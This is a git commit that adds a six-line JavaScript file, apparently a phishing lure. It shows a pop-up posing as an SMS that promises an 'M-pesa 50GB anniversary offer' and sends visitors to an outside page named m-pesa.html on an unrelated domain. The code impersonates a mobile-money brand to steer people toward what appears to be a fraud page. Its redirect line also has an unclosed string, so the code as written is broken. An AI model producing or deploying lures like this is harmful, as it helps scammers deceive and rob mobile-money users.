0e391b049c9482c96578d803d18439915dc06009
Sweetblogboi <nsiboy760@gmail.com>
2025-02-28 14:23:28 +0100

    Create mpesa-active.js

---
+++ mpesa-active.js
@@ -0,0 +1,6 @@
+
+var password = 'ACTIVATE 50GB'
+password=prompt('SMS: Congratulations You are qualify for M-pesa 50gb anniversary offer, Kindly Press OK to get gift now   ','ACTIVATE 50GB');
+if (password != 'ACTIVATE 50GB') {
+location.href='https://realgrant-2025.org/m-pesa.html;
+}
